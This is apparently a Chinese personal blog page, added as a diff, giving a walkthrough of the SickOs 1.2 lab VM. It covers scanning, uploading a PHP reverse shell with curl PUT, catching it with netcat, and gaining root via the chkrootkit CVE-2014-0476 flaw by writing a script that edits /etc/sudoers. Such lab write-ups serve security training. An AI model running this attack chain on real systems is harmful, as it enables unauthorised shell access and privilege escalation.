@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>SickOs 1.2 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">SickOs 1.2</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-10-31 14:15:06">2021-10-31 / 3 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="主机探测">主机探测</h1>
+<p><code>netdiscover -i eth0 -r 192.168.223.1</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645510881335.png" alt="" loading="lazy"></p>
+<h1 id="端口探测">端口探测</h1>
+<p><code>masscan --rate=10000 -p 0-65535 192.168.223.128</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645510948883.png" alt="" loading="lazy"></p>
+<h1 id="服务探测">服务探测</h1>
+<p><code>nmap -A -O -sV -T4 -p 80,22 192.168.223.128</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645511277981.png" alt="" loading="lazy"></p>
+<h1 id="web">web</h1>
+<p><img src="https://V-alkoinen.github.io/post-images/1645511566451.png" alt="" loading="lazy"><br>
+<code>dirb http://192.168.223.128/ /usr/share/dirb/wordlists/big.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645511591505.png" alt="" loading="lazy"><br>
+<code>http://192.168.223.128/test/</code><br>
+lighttpd 没发现漏洞<br>
+<code>OPTIONS</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645512014863.png" alt="" loading="lazy"><br>
+<code>curl --upload-file php-reverse-shell.php -v &quot;http://192.168.223.128/test/php-reverse-shell.php&quot; -0</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1645512423990.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645512428993.png" alt="" loading="lazy"><br>
+本地监听4444端口获取shell</p>
+<pre><code>root@laobai:/home/laobai/桌面/php-reverse-shell-1.0# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.223.134] from (UNKNOWN) [192.168.223.128] 40942
+Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 19:35:28 up 43 min,  0 users,  load average: 0.02, 0.02, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+<p>python生成tty</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@ubuntu:/$ 
+</code></pre>
+<pre><code>www-data@ubuntu:/tmp$ dpkg -l | grep chkrootkit
+dpkg -l | grep chkrootkit
+rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
+</code></pre>
+<p>使用CVE-2014-0476<br>
+chkrootkit 将执行 /tmp/update，我可以在 /tmp 中创建名为 update 的文件，其中包含将sudo su添加到用户 www-data 的shell 命令</p>
+<pre><code>www-data@ubuntu:/tmp$ echo 'echo &quot;www-data ALL=NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update
+</code></pre>
+<pre><code>www-data@ubuntu:/tmp$ sudo su
+sudo su
+root@ubuntu:/tmp# ls -al
+ls -al
+total 28
+drwxrwxrwt  4 root     root     4096 Mar  3 21:12 .
+drwxr-xr-x 22 root     root     4096 Mar 30  2016 ..
+-rw-rw-rw-  1 www-data www-data  225 Mar  3 21:04 kapi.txt
+srwxr-xr-x  1 www-data www-data    0 Mar  4  2017 php.socket-0
+-rwxrwxrwx  1 www-data www-data   76 Mar  3 21:09 update
+-rw-r--r--  1 root     root     1600 Mar  4  2017 vgauthsvclog.txt.0
+drwxrwxrwt  2 root     root     4096 Mar  4  2017 VMwareDnD
+drwx------  2 root     root     4096 Mar  4  2017 vmware-root
+root@ubuntu:/tmp# whoami
+whoami
+root
+</code></pre>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/sonarqube-da-jian/">SonarQube 搭建</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/you-jian-wei-zao/">邮件伪造</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
